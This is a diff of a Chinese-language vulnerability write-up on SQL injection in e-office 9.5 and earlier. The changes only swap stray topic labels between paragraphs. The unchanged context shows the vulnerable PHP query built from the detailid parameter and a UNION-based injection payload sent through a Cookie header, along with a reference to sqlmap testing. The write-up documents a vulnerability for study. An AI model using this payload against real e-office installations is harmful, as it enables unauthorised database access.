@@ -22,7 +22,7 @@ e-office <=9.5
 
 直接看 sms\_page.php 文件业务逻辑实现
 
-漏洞分析报告
+软件
 
 ```
 <?php
@@ -51,17 +51,9 @@ $sql = "UPDATE sms\r\n\t\t\tSET REMIND_FLAG = 0\r\n\t\t\tWHERE SMS_ID = '".$smsi
 exequery( $connection, $sql );
 ```
 
-深入探索
-
-安全研究资源
-
-Web安全博客
-
-安全工具下载
-
 `$detailid` ==> `$smsid` ==> `getSmsInfo` getSmsInfo 函数业务逻辑如下
 
-软件
+计算机安全
 
 ```
 public function getSmsInfo( $limit = 0, $start = 0, $smsid = "", $keyWord = "" )
@@ -86,7 +78,7 @@ public function getSmsInfo( $limit = 0, $start = 0, $smsid = "", $keyWord = "" )
 
 `$detailid` 通过 `$_REQUEST['detailid']` 获取，`$_REQUEST` 在 PHP 里属于一个包含了 `GET` 、`POST` 和 `COOKIE` 方法传递参数的超全局数组，因此在测试时可使用 `Cookie` 传递 `detailid` 值进入SQL语句中。
 
-网络安全
+数据管理
 
 # 漏洞复现
 
@@ -100,7 +92,7 @@ Cookie: detailid=11 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b716b71,0x5
 
 通过联合注入 成功在响应回显了测试payload。
 
-SQL注入防护
+编程
 
 通过 [sqlmap](https://mrxn.net/tag/sqlmap "sqlmap") 还可测试出其他注入方式如下
 
@@ -125,5 +117,3 @@ Parameter: detailid (GET)
 PS
 
 > 这是一个很老的漏洞，最近被人拿出来刷，我就考古看下 =\_= !
->
-> 数据管理
